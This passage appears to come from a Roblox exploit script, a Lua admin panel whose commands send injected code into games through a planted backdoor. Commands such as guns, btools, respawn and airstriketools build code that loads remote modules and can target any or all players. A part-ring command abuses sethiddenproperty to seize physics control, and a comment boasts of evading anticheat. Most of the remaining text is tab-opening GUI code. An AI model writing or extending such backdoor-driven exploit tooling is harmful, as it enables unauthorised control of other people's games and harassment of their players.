			local existingBillboard = head:FindFirstChild("headbillboarduwu")
			if existingBillboard then
				existingBillboard:Destroy()
			end
		end
	end

	if not backdoor then
		if not target or target == "" or target == "me" then
			nobillboa(localPlayer)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			nobillboa(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					nobillboa(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				nobillboa(player)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					nobillboa(player)
					break
				end
			end
		end
		return
	end

	local bckd

	if not target or target == "" or target == "me" then
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player.Character and player.Character:FindFirstChild("Head") then
                local head = player.Character.Head
                local existingBillboard = head:FindFirstChild("headbillboarduwu")
                if existingBillboard then
                    existingBillboard:Destroy()
                end
            end
        ]], localPlayerName)
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player.Character and player.Character:FindFirstChild("Head") then
                local head = player.Character.Head
                local existingBillboard = head:FindFirstChild("headbillboarduwu")
                if existingBillboard then
                    existingBillboard:Destroy()
                end
            end
        ]], randomPlayer.Name)
	elseif target == "others" then
		bckd = string.format([[
            local localPlayerName = "%s"
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Name ~= localPlayerName and player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head
                    local existingBillboard = head:FindFirstChild("headbillboarduwu")
                    if existingBillboard then
                        existingBillboard:Destroy()
                    end
                end
            end
        ]], localPlayerName)
	elseif target == "all" then
		bckd = [[
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head
                    local existingBillboard = head:FindFirstChild("headbillboarduwu")
                    if existingBillboard then
                        existingBillboard:Destroy()
                    end
                end
            end
        ]]
	else
		bckd = string.format([[
            local targetName = "%s"
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if string.find(string.lower(player.Name), string.lower(targetName)) and player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head
                    local existingBillboard = head:FindFirstChild("headbillboarduwu")
                    if existingBillboard then
                        existingBillboard:Destroy()
                    end
                end
            end
        ]], target)
	end

	if bckd then
		runbackdoor(backdoor, bckd)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local function getbckd(target, actionScript)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	local function plrref(playerName)
		return string.format('game:GetService("Players"):FindFirstChild("%s")', playerName)
	end

	local processedActionScript = actionScript
		:gsub("%%replace%%", "%%username%%")
		:gsub("%%otherreplace%%", "%%playerref%%")

	if not target or target == "" or target == "me" then
		return processedActionScript
			:gsub("%%username%%", string.format('"%s"', localPlayer.Name))
			:gsub("%%playerref%%", plrref(localPlayer.Name))
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		return processedActionScript
			:gsub("%%username%%", string.format('"%s"', randomPlayer.Name))
			:gsub("%%playerref%%", plrref(randomPlayer.Name))
	elseif target == "others" then
		return string.format([[
            local players = game:GetService("Players"):GetPlayers()
            local localPlayer = game.Players.LocalPlayer
            for _, player in ipairs(players) do
                if player ~= localPlayer then
                    %s
                end
            end
        ]], processedActionScript
				:gsub("%%username%%", "player.Name")
				:gsub("%%playerref%%", "player"))
	elseif target == "all" then
		return string.format([[
            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                %s
            end
        ]], processedActionScript
				:gsub("%%username%%", "player.Name")
				:gsub("%%playerref%%", "player"))
	else
		return string.format([[
            local targetName = "%s":lower()
            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                if player.Name:lower():find(targetName) then
                    %s
                end
            end
        ]], target, processedActionScript
				:gsub("%%username%%", "player.Name")
				:gsub("%%playerref%%", "player"))
	end
end

-------------------------------------------------------------------------------------------------------------------------------

addcommand("r6", "r6", function(target)
	if not backdoor then 
		unablenotify("you cannot run this command without a backdoor.") return
	end

	local actionScript = "require(10869521285).ConvertRig(%otherreplace%, Enum.HumanoidRigType.R6)"
	local bckd = getbckd(target, actionScript)

	runbackdoor(backdoor, bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("r15", "r15", function(target)
	if not backdoor then 
		unablenotify("you cannot run this command without a backdoor.") return
	end

	local actionScript = "require(10869521285).ConvertRig(%otherreplace%, Enum.HumanoidRigType.R15)"
	local bckd = getbckd(target, actionScript)

	runbackdoor(backdoor, bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("respawn", "re", function(target)
	if not backdoor then 
		unablenotify("you cannot run this command without a backdoor.") return
	end

	local actionScript = "%otherreplace%:LoadCharacter()"
	local bckd = getbckd(target, actionScript)

	runbackdoor(backdoor, bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("kazotskykick", "kk", function(target)
	if not backdoor then 
		unablenotify("you cannot run this command without a backdoor.") return
	end

	local actionScript = "require(6728874428).basskick(%replace%)"
	local bckd = getbckd(target, actionScript)

	runbackdoor(backdoor, bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("eggdog", "eggdog", function(target)
	if not backdoor then 
		unablenotify("you cannot run this command without a backdoor.") return
	end

	local actionScript = "require(4460809464).load(%replace%)"
	local bckd = getbckd(target, actionScript)

	runbackdoor(backdoor, bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("guns", "guns", function(target)
	if not backdoor then 
		unablenotify("you cannot run this command without a backdoor.") return
	end

	local actionScript = "require(4922496226).Dreamer(%replace%)"
	local bckd = getbckd(target, actionScript)

	runbackdoor(backdoor, bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("btools", "f3x", function(target)
	if not backdoor then 
		unablenotify("you cannot run this command without a backdoor.") return
	end

	local actionScript = "require(12158566951)(%replace%)"
	local bckd = getbckd(target, actionScript)

	runbackdoor(backdoor, bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("tools", "tools", function(target)
	if not backdoor then 
		unablenotify("you cannot run this command without a backdoor.") return
	end

	local actionScript = "require(4888483885).ok(%replace%)"
	local bckd = getbckd(target, actionScript)

	runbackdoor(backdoor, bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("airstriketools", "ast", function(target)
	if not backdoor then 
		unablenotify("you cannot run this command without a backdoor.") return
	end

	local actionScript = "require(11670894308).Strafe(%replace%)"
	local bckd = getbckd(target, actionScript)

	runbackdoor(backdoor, bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

local ringPartsEnabled = false

addcommand("partring", "pring", function(radius)
	if not ringPartsEnabled then execcmd("unpring") end
	ringPartsEnabled = true

	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local UserInputService = game:GetService("UserInputService")
	local SoundService = game:GetService("SoundService")
	local StarterGui = game:GetService("StarterGui")
	local TextChatService = game:GetService("TextChatService")

	local LocalPlayer = Players.LocalPlayer

	-- Ring Parts Logic
	if not getgenv().Network then
		getgenv().Network = {
			BaseParts = {},
			Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
		}
		Network.RetainPart = function(Part)
			if typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(workspace) then
				table.insert(Network.BaseParts, Part)
				Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
				Part.CanCollide = false
			end
		end
		local function EnablePartControl()
			--LocalPlayer.ReplicationFocus = workspace Yep, this caused the script to be undetectable, now you can freely exploit on those heavy anticheat servers, (lol have fun)
			RunService.Heartbeat:Connect(function()
				sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
				for _, Part in pairs(Network.BaseParts) do
					if Part:IsDescendantOf(workspace) then
						Part.Velocity = Network.Velocity
					end
				end
			end)
		end
		EnablePartControl()
	end

	local radius = radius or 50
	local height = 100
	local rotationSpeed = 10
	local attractionStrength = 1000

	local function RetainPart(Part)
		if Part:IsA("BasePart") and not Part.Anchored and Part:IsDescendantOf(workspace) and not Part:IsGrounded() then
			if Part.Parent == LocalPlayer.Character or Part:IsDescendantOf(LocalPlayer.Character) then
				return false
			end

			Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
			Part.CanCollide = false
			return true
		end
		return false
	end

	local parts = {}
	local function addPart(part)
		if RetainPart(part) then
			if not table.find(parts, part) then
				table.insert(parts, part)
			end
		end
	end

	local function removePart(part)
		local index = table.find(parts, part)
		if index then
			table.remove(parts, index)
		end
	end

	for _, part in pairs(workspace:GetDescendants()) do
		addPart(part)
	end

	workspace.DescendantAdded:Connect(addPart)
	workspace.DescendantRemoving:Connect(removePart)

	RunService.Heartbeat:Connect(function()
		if not ringPartsEnabled then return end

		local humanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		if humanoidRootPart then
			local tornadoCenter = humanoidRootPart.Position
			for _, part in pairs(parts) do
				if part.Parent and not part.Anchored then
					local pos = part.Position
					local distance = (Vector3.new(pos.X, tornadoCenter.Y, pos.Z) - tornadoCenter).Magnitude
					local angle = math.atan2(pos.Z - tornadoCenter.Z, pos.X - tornadoCenter.X)
					local newAngle = angle + math.rad(rotationSpeed)
					local targetPos = Vector3.new(
						tornadoCenter.X + math.cos(newAngle) * math.min(radius, distance),
						tornadoCenter.Y + (height * (math.abs(math.sin((pos.Y - tornadoCenter.Y) / height)))),
						tornadoCenter.Z + math.sin(newAngle) * math.min(radius, distance)
					)
					local directionToTarget = (targetPos - part.Position).unit
					part.Velocity = directionToTarget * attractionStrength
				end
			end
		end
	end)
end)

addcommand("unpartring", "unpring", function()
	ringPartsEnabled = false
end)

-------------------------------------------------------------------------------------------------------------------------------

donuttabopen = false
donutrunning = nil

addcommand("opendonuttab", "donut", function()
	if donuttabopen then return end
	donuttabreallyminimized = false
	donuttabminimized = false
	donuttabopen = true

	if donutrunning then
		donutrunning:Disconnect()
		donutrunning = nil
	end

	local A, B = 0, 0
	local lastdonutupd = 0
	local donutupdinterval = 0.1
	local framebuffer = table.create(22)
	local chars = (".,-~:;=!*#$@"):split("")

	local sin, cos, floor, clamp = math.sin, math.cos, math.floor, math.clamp
	local pi2 = math.pi * 2

	task.spawn(function()
		donutrunning = box["run service"].RenderStepped:Connect(function()
			if box["donut"].TextTransparency == 0 then
				local currenttime = os.clock()
				if currenttime - lastdonutupd >= donutupdinterval then
					lastdonutupd = currenttime

					for i = 1, 22 do
						framebuffer[i] = {}
						for j = 1, 80 do
							framebuffer[i][j] = ' '
						end
					end

					local zBuffer = table.create(1760, 0)

					for j = 0, pi2, 0.07 do
						local sinJ = sin(j)
						local cosJ = cos(j)
						local sinA = sin(A)
						local cosA = cos(A)
						local sinB = sin(B)
						local cosB = cos(B)

						for i = 0, pi2, 0.02 do
							local sinI = sin(i)
							local cosI = cos(i)

							local h = cosJ + 2
							local D = 1 / (sinI * h * sinA + sinJ * cosA + 5)
							local t = sinI * h * cosA - sinJ * sinA

							local x = floor(40 + 30 * D * (cosI * h * cosB - t * sinB))
							local y = floor(12 + 15 * D * (cosI * h * sinB + t * cosB))
							local o = x + 80 * y

							if y >= 0 and y < 22 and x >= 0 and x < 80 then
								local N = floor(8 * ((sinJ * sinA - sinI * cosJ * cosA) * cosB - 
									sinI * cosJ * sinA - sinJ * cosA - 
									cosI * cosJ * sinB))

								if D > zBuffer[o] then
									zBuffer[o] = D
									framebuffer[y+1][x+1] = chars[clamp(N, 1, 12)]
								end
							end
						end
					end

					local output = {}
					for y = 1, 22 do
						output[y] = table.concat(framebuffer[y])
					end
					box["donut"].Text = table.concat(output, "\n")

					A = A + 0.04
					B = B + 0.08
				end
			end
		end)
	end)

	box["donut tab block main frame"].Size = UDim2.new(0, 276, 0, 233)
	box["donut tab top bar minimize button"].Text = "-"
	box["donut tab block main frame"].BackgroundTransparency = 1
	box["donut tab main frame 1"].Visible = true
	local gui = box["donut tab block all"]
	box["donut tab top bar"].Visible = true
	box["donut tab top bar"].TextTransparency = 1
	box["donut tab top bar"].BackgroundTransparency = 1
	box["donut tab main frame 1"].BackgroundTransparency = 1
	box["donut tab top bar close button"].BackgroundTransparency = 1
	box["donut tab top bar minimize button"].BackgroundTransparency = 1
	box["donut tab top bar reposition button"].BackgroundTransparency = 1
	box["donut tab top bar close button"].TextTransparency = 1
	box["donut tab top bar minimize button"].TextTransparency = 1
	box["donut tab top bar reposition button"].TextTransparency = 1
	box["donut tab main frame 1"].BackgroundTransparency = 1
	box["donut"].BackgroundTransparency = 1
	box["donut"].TextTransparency = 1

	gui.BackgroundTransparency = 0
	gui.Size = UDim2.new(0, 276, 0, 0)
	gui.Position = UDim2.new(0, 0, 0, 0)
	gui.Visible = true

	local tweenIn = tweenSizePosition(
		gui,
		UDim2.new(0, 276, 0, 260),
		UDim2.new(0, 0, 0, 0),
		0.5
	)
	tweenIn.Completed:Wait()
	updcols()

	box["donut tab top bar"].Visible = true
	box["donut tab top bar"].BackgroundTransparency = 0
	box["donut tab main frame 1"].BackgroundTransparency = 0
	box["donut tab top bar close button"].BackgroundTransparency = 0
	box["donut tab top bar minimize button"].BackgroundTransparency = 0
	box["donut tab top bar reposition button"].BackgroundTransparency = 0
	box["donut tab top bar close button"].TextTransparency = 0
	box["donut tab top bar minimize button"].TextTransparency = 0
	box["donut tab top bar reposition button"].TextTransparency = 0
	box["donut tab top bar"].TextTransparency = 0
	box["donut tab main frame 1"].BackgroundTransparency = 0
	box["donut"].BackgroundTransparency = 0
	box["donut"].TextTransparency = 0

	local fadeTween = fade(gui, 1, 0.2)
	fadeTween.Completed:Wait()

	gui.Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

binarytabopen = false
binaryrunning = nil

addcommand("openbinarytab", "binary", function()
	if binarytabopen then return end
	binarytabreallyminimized = false
	binarytabopen = true
	binarytabminimized = false

	if binaryrunning then
		binaryrunning:Disconnect()
		binaryrunning = nil
	end

	spawn(function()
		binaryrunning = box["run service"].RenderStepped:Connect(function()
			if box["binary"].TextTransparency == 0 then
				changebinary()
			end
		end)
	end)

	box["binary tab block main frame"].Size = UDim2.new(0, 246, 0, 203)
	box["binary tab block main frame"].BackgroundTransparency = 1
	box["binary tab top bar minimize button"].Text = "-"
	box["binary tab main frame 1"].Visible = true
	local gui = box["binary tab block all"]
	box["binary tab top bar"].Visible = true
	box["binary tab top bar"].TextTransparency = 1
	box["binary tab top bar"].BackgroundTransparency = 1
	box["binary tab main frame 1"].BackgroundTransparency = 1
	box["binary tab top bar close button"].BackgroundTransparency = 1
	box["binary tab top bar minimize button"].BackgroundTransparency = 1
	box["binary tab top bar reposition button"].BackgroundTransparency = 1
	box["binary tab top bar close button"].TextTransparency = 1
	box["binary tab top bar minimize button"].TextTransparency = 1
	box["binary tab top bar reposition button"].TextTransparency = 1
	box["binary tab main frame 1"].BackgroundTransparency = 1
	box["binary"].BackgroundTransparency = 1
	box["binary"].TextTransparency = 1

	gui.BackgroundTransparency = 0
	gui.Size = UDim2.new(0, 246, 0, 0)
	gui.Position = UDim2.new(0, 0, 0, 0)
	gui.Visible = true

	local tweenIn = tweenSizePosition(
		gui,
		UDim2.new(0, 246, 0, 230),
		UDim2.new(0, 0, 0, 0),
		0.5
	)
	tweenIn.Completed:Wait()
	updcols()

	box["binary tab top bar"].Visible = true
	box["binary tab top bar"].BackgroundTransparency = 0
	box["binary tab main frame 1"].BackgroundTransparency = 0
	box["binary tab top bar close button"].BackgroundTransparency = 0
	box["binary tab top bar minimize button"].BackgroundTransparency = 0
	box["binary tab top bar reposition button"].BackgroundTransparency = 0
	box["binary tab top bar close button"].TextTransparency = 0
	box["binary tab top bar minimize button"].TextTransparency = 0
	box["binary tab top bar reposition button"].TextTransparency = 0
	box["binary tab top bar"].TextTransparency = 0
	box["binary tab main frame 1"].BackgroundTransparency = 0
	box["binary"].BackgroundTransparency = 0
	box["binary"].TextTransparency = 0

	local fadeTween = fade(gui, 1, 0.2)
	fadeTween.Completed:Wait()

	gui.Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

hcgentabopen = false

addcommand("openheadcanongeneratortab", "hcgen", function()
	if hcgentabopen then return end
	hcgentabreallyminimized = false
	hcgentabopen = true
	hcgentabminimized = false

	box["headcanon generator tab block main frame"].Size = UDim2.new(0, 446, 0, 141)
	box["headcanon generator tab block main frame"].BackgroundTransparency = 1
	box["headcanon generator tab top bar minimize button"].Text = "-"
	box["headcanon generator tab main frame 1"].Visible = true
	local gui = box["headcanon generator tab block all"]
	box["headcanon generator tab top bar"].Visible = true
	box["headcanon generator tab top bar"].TextTransparency = 1
	box["headcanon generator tab top bar"].BackgroundTransparency = 1
	box["headcanon generator tab main frame 1"].BackgroundTransparency = 1
	box["headcanon generator tab top bar close button"].BackgroundTransparency = 1
	box["headcanon generator tab top bar minimize button"].BackgroundTransparency = 1
	box["headcanon generator tab top bar reposition button"].BackgroundTransparency = 1
	box["headcanon generator tab top bar close button"].TextTransparency = 1
	box["headcanon generator tab top bar minimize button"].TextTransparency = 1
	box["headcanon generator tab top bar reposition button"].TextTransparency = 1
	box["headcanon generator tab main frame 1"].BackgroundTransparency = 1
	box["headcanon generator output"].BackgroundTransparency = 1
	box["headcanon generator output"].TextTransparency = 1
	box["headcanon generator input"].BackgroundTransparency = 1
	box["headcanon generator input"].TextTransparency = 1
	box["headcanon generator input 2"].BackgroundTransparency = 1
	box["headcanon generator input 2"].TextTransparency = 1
	box["generate headcanon"].BackgroundTransparency = 1
	box["generate headcanon"].TextTransparency = 1

	gui.BackgroundTransparency = 0
	gui.Size = UDim2.new(0, 446, 0, 0)
	gui.Position = UDim2.new(0, 0, 0, 0)
	gui.Visible = true

	local tweenIn = tweenSizePosition(
		gui,
		UDim2.new(0, 446, 0, 168),
		UDim2.new(0, 0, 0, 0),
		0.5
	)
	tweenIn.Completed:Wait()
	updcols()

	box["headcanon generator tab top bar"].Visible = true
	box["headcanon generator tab top bar"].BackgroundTransparency = 0
	box["headcanon generator tab main frame 1"].BackgroundTransparency = 0
	box["headcanon generator tab top bar close button"].BackgroundTransparency = 0
	box["headcanon generator tab top bar minimize button"].BackgroundTransparency = 0
	box["headcanon generator tab top bar reposition button"].BackgroundTransparency = 0
	box["headcanon generator tab top bar close button"].TextTransparency = 0
	box["headcanon generator tab top bar minimize button"].TextTransparency = 0
	box["headcanon generator tab top bar reposition button"].TextTransparency = 0
	box["headcanon generator tab top bar"].TextTransparency = 0
	box["headcanon generator tab main frame 1"].BackgroundTransparency = 0
	box["headcanon generator output"].BackgroundTransparency = 0
	box["headcanon generator output"].TextTransparency = 0
	box["headcanon generator input"].BackgroundTransparency = 0
	box["headcanon generator input"].TextTransparency = 0
	box["headcanon generator input 2"].BackgroundTransparency = 0
	box["headcanon generator input 2"].TextTransparency = 0
	box["generate headcanon"].BackgroundTransparency = 0
	box["generate headcanon"].TextTransparency = 0

	local fadeTween = fade(gui, 1, 0.2)
	fadeTween.Completed:Wait()

	gui.Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

gaydartabopen = false

addcommand("opengaydartab", "gaydar", function()
	if gaydartabopen then return end
	gaydartabreallyminimized = false
	gaydartabopen = true
	gaydartabminimized = false

	box["gaydar tab block main frame"].Size = UDim2.new(0, 376, 0, 203)
	box["gaydar tab block main frame"].BackgroundTransparency = 1
	box["gaydar tab top bar minimize button"].Text = "-"
	box["gaydar tab main frame 1"].Visible = true
	local gui = box["gaydar tab block all"]
	box["gaydar tab top bar"].Visible = true
	box["gaydar tab top bar"].TextTransparency = 1
	box["gaydar tab top bar"].BackgroundTransparency = 1
	box["gaydar tab main frame 1"].BackgroundTransparency = 1
	box["gaydar tab top bar close button"].BackgroundTransparency = 1
	box["gaydar tab top bar minimize button"].BackgroundTransparency = 1
	box["gaydar tab top bar reposition button"].BackgroundTransparency = 1
	box["gaydar tab top bar close button"].TextTransparency = 1
	box["gaydar tab top bar minimize button"].TextTransparency = 1
	box["gaydar tab top bar reposition button"].TextTransparency = 1
	box["gaydar tab main frame 1"].BackgroundTransparency = 1
	box["gaydar scan"].TextTransparency = 1
	box["gaydar scan"].BackgroundTransparency = 1
	box["gaydar target"].TextTransparency = 1
	box["gaydar target"].BackgroundTransparency = 1
	box["gaydar info"].TextTransparency = 1
	box["gaydar info"].BackgroundTransparency = 1
	box["gaydar"].BackgroundTransparency = 1
	box["gaydar"].ImageTransparency = 1

	gui.BackgroundTransparency = 0
	gui.Size = UDim2.new(0, 376, 0, 0)
	gui.Position = UDim2.new(0, 0, 0, 0)
	gui.Visible = true

	local tweenIn = tweenSizePosition(
		gui,
		UDim2.new(0, 376, 0, 230),
		UDim2.new(0, 0, 0, 0),
		0.5
	)
	tweenIn.Completed:Wait()
	updcols()

	box["gaydar tab top bar"].Visible = true
	box["gaydar tab top bar"].BackgroundTransparency = 0
	box["gaydar tab main frame 1"].BackgroundTransparency = 0
	box["gaydar tab top bar close button"].BackgroundTransparency = 0
	box["gaydar tab top bar minimize button"].BackgroundTransparency = 0
	box["gaydar tab top bar reposition button"].BackgroundTransparency = 0
	box["gaydar tab top bar close button"].TextTransparency = 0
	box["gaydar tab top bar minimize button"].TextTransparency = 0
	box["gaydar tab top bar reposition button"].TextTransparency = 0
	box["gaydar tab top bar"].TextTransparency = 0
	box["gaydar tab main frame 1"].BackgroundTransparency = 0
	box["gaydar scan"].TextTransparency = 0
	box["gaydar scan"].BackgroundTransparency = 0
	box["gaydar target"].TextTransparency = 0
	box["gaydar target"].BackgroundTransparency = 0
	box["gaydar info"].TextTransparency = 0
	box["gaydar info"].BackgroundTransparency = 0
	box["gaydar"].BackgroundTransparency = 0
	box["gaydar"].ImageTransparency = 0

	local fadeTween = fade(gui, 1, 0.2)
	fadeTween.Completed:Wait()

	gui.Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

videotabopen = false

addcommand("openvideotab", "video", function()
	if videotabopen then return end
	videotabreallyminimized = false
	videotabopen = true
	videotabminimized = false

	box["video tab block main frame"].Size = UDim2.new(0, 208, 0, 288)
	box["video tab block main frame"].BackgroundTransparency = 1
	box["video tab top bar minimize button"].Text = "-"
	box["video tab main frame 1"].Visible = true
	local gui = box["video tab block all"]
	box["video tab top bar"].Visible = true
	box["video tab top bar"].TextTransparency = 1
	box["video tab top bar"].BackgroundTransparency = 1
	box["video tab main frame 1"].BackgroundTransparency = 1
	box["video tab top bar close button"].BackgroundTransparency = 1
	box["video tab top bar minimize button"].BackgroundTransparency = 1
	box["video tab top bar reposition button"].BackgroundTransparency = 1
	box["video tab top bar close button"].TextTransparency = 1
	box["video tab top bar minimize button"].TextTransparency = 1
	box["video tab top bar reposition button"].TextTransparency = 1
	box["video tab top bar"].TextTransparency = 1
	box["video tab main frame 1"].BackgroundTransparency = 1
	box["video id textbox"].TextTransparency = 1
	box["video id textbox"].BackgroundTransparency = 1
	box["video id enter"].TextTransparency = 1
	box["video id enter"].BackgroundTransparency = 1
	box["video"].BackgroundTransparency = 1
	-- box["video"].VideoFrame.ImageTransparency = 1

	gui.BackgroundTransparency = 0
	gui.Size = UDim2.new(0, 208, 0, 0)
	gui.Position = UDim2.new(0, 0, 0, 0)
	gui.Visible = true

	local tweenIn = tweenSizePosition(
		gui,
		UDim2.new(0, 208, 0, 315),
		UDim2.new(0, 0, 0, 0),
		0.5
	)
	tweenIn.Completed:Wait()
	updcols()

	box["video tab top bar"].Visible = true
	box["video tab top bar"].BackgroundTransparency = 0
	box["video tab main frame 1"].BackgroundTransparency = 0
	box["video tab top bar close button"].BackgroundTransparency = 0
	box["video tab top bar minimize button"].BackgroundTransparency = 0
	box["video tab top bar reposition button"].BackgroundTransparency = 0
	box["video tab top bar close button"].TextTransparency = 0
	box["video tab top bar minimize button"].TextTransparency = 0
	box["video tab top bar reposition button"].TextTransparency = 0
	box["video tab top bar"].TextTransparency = 0
	box["video tab main frame 1"].BackgroundTransparency = 0
	box["video id textbox"].TextTransparency = 0
	box["video id textbox"].BackgroundTransparency = 0
	box["video id enter"].TextTransparency = 0
	box["video id enter"].BackgroundTransparency = 0
	box["video"].BackgroundTransparency = 0
	-- box["video"].VideoFrame.ImageTransparency = 0

	local fadeTween = fade(gui, 1, 0.2)
	fadeTween.Completed:Wait()

	gui.Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

msgrevtabopen = false

addcommand("openmessagereversertab", "msgreverser", function()
	if msgrevtabopen then return end
	msgrevtabreallyminimized = false
	msgrevtabopen = true
	msgrevtabminimized = false

	box["message reverser tab block main frame"].Size = UDim2.new(0, 345, 0, 141)
	box["message reverser tab block main frame"].BackgroundTransparency = 1
	box["message reverser tab top bar minimize button"].Text = "-"
	box["message reverser tab main frame 1"].Visible = true
	local gui = box["message reverser tab block all"]
	box["message reverser tab top bar"].Visible = true
	box["message reverser tab top bar"].TextTransparency = 1
	box["message reverser tab top bar"].BackgroundTransparency = 1
	box["message reverser tab main frame 1"].BackgroundTransparency = 1
	box["message reverser tab top bar close button"].BackgroundTransparency = 1
	box["message reverser tab top bar minimize button"].BackgroundTransparency = 1
	box["message reverser tab top bar reposition button"].BackgroundTransparency = 1
	box["message reverser tab top bar close button"].TextTransparency = 1
	box["message reverser tab top bar minimize button"].TextTransparency = 1
	box["message reverser tab top bar reposition button"].TextTransparency = 1
	box["message reverser tab main frame 1"].BackgroundTransparency = 1
	box["message reverser input"].BackgroundTransparency = 1
	box["message reverser input"].TextTransparency = 1
	box["reverse message"].BackgroundTransparency = 1
	box["reverse message"].TextTransparency = 1
	box["clear message reverser input"].BackgroundTransparency = 1
	box["clear message reverser input"].TextTransparency = 1

	gui.BackgroundTransparency = 0
	gui.Size = UDim2.new(0, 345, 0, 0)
	gui.Position = UDim2.new(0, 0, 0, 0)
	gui.Visible = true

	local tweenIn = tweenSizePosition(
		gui,
		UDim2.new(0, 345, 0, 168),
		UDim2.new(0, 0, 0, 0),
		0.5
	)
	tweenIn.Completed:Wait()
	updcols()

	box["message reverser tab top bar"].Visible = true
	box["message reverser tab top bar"].BackgroundTransparency = 0
	box["message reverser tab main frame 1"].BackgroundTransparency = 0
	box["message reverser tab top bar close button"].BackgroundTransparency = 0
	box["message reverser tab top bar minimize button"].BackgroundTransparency = 0
	box["message reverser tab top bar reposition button"].BackgroundTransparency = 0
	box["message reverser tab top bar close button"].TextTransparency = 0
	box["message reverser tab top bar minimize button"].TextTransparency = 0
	box["message reverser tab top bar reposition button"].TextTransparency = 0
	box["message reverser tab top bar"].TextTransparency = 0
	box["message reverser tab main frame 1"].BackgroundTransparency = 0
	box["message reverser input"].BackgroundTransparency = 0
	box["message reverser input"].TextTransparency = 0
	box["reverse message"].BackgroundTransparency = 0
	box["reverse message"].TextTransparency = 0
	box["clear message reverser input"].BackgroundTransparency = 0
	box["clear message reverser input"].TextTransparency = 0

	local fadeTween = fade(gui, 1, 0.2)
	fadeTween.Completed:Wait()

	gui.Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

noxsectabopen = false

addcommand("opennoxsecencoderanddecodertab", "noxsec", function()
	if noxsectabopen then return end
	noxsectabreallyminimized = false
	noxsectabopen = true
	noxsectabminimized = false

	box["noxsec encoder and decoder tab block main frame"].Size = UDim2.new(0, 545, 0, 241)
	box["noxsec encoder and decoder tab block main frame"].BackgroundTransparency = 1
	box["noxsec encoder and decoder tab top bar minimize button"].Text = "-"
	box["noxsec encoder and decoder tab main frame 1"].Visible = true
	local gui = box["noxsec encoder and decoder tab block all"]
	box["noxsec encoder and decoder tab top bar"].Visible = true
	box["noxsec encoder and decoder tab top bar"].TextTransparency = 1
	box["noxsec encoder and decoder tab top bar"].BackgroundTransparency = 1
	box["noxsec encoder and decoder tab main frame 1"].BackgroundTransparency = 1
	box["noxsec encoder and decoder tab top bar close button"].BackgroundTransparency = 1
	box["noxsec encoder and decoder tab top bar minimize button"].BackgroundTransparency = 1
	box["noxsec encoder and decoder tab top bar reposition button"].BackgroundTransparency = 1
	box["noxsec encoder and decoder tab top bar close button"].TextTransparency = 1
	box["noxsec encoder and decoder tab top bar minimize button"].TextTransparency = 1
	box["noxsec encoder and decoder tab top bar reposition button"].TextTransparency = 1
	box["noxsec encoder and decoder tab main frame 1"].BackgroundTransparency = 1
	box["noxsec encoder and decoder input"].BackgroundTransparency = 1
	box["noxsec encoder and decoder input"].TextTransparency = 1
	box["noxsec decode"].BackgroundTransparency = 1
	box["noxsec decode"].TextTransparency = 1
	box["noxsec encode"].BackgroundTransparency = 1
	box["noxsec encode"].TextTransparency = 1
	box["clear noxsec encoder and decoder input"].BackgroundTransparency = 1
	box["clear noxsec encoder and decoder input"].TextTransparency = 1
	box["copy noxsec encoder and decoder input"].BackgroundTransparency = 1
	box["copy noxsec encoder and decoder input"].TextTransparency = 1

	gui.BackgroundTransparency = 0
	gui.Size = UDim2.new(0, 545, 0, 0)
	gui.Position = UDim2.new(0, 0, 0, 0)
	gui.Visible = true

	local tweenIn = tweenSizePosition(
		gui,
		UDim2.new(0, 545, 0, 268),
		UDim2.new(0, 0, 0, 0),
		0.5
	)
	tweenIn.Completed:Wait()
	updcols()

	box["noxsec encoder and decoder tab top bar"].Visible = true
	box["noxsec encoder and decoder tab top bar"].BackgroundTransparency = 0
	box["noxsec encoder and decoder tab main frame 1"].BackgroundTransparency = 0
	box["noxsec encoder and decoder tab top bar close button"].BackgroundTransparency = 0
	box["noxsec encoder and decoder tab top bar minimize button"].BackgroundTransparency = 0
	box["noxsec encoder and decoder tab top bar reposition button"].BackgroundTransparency = 0
	box["noxsec encoder and decoder tab top bar close button"].TextTransparency = 0
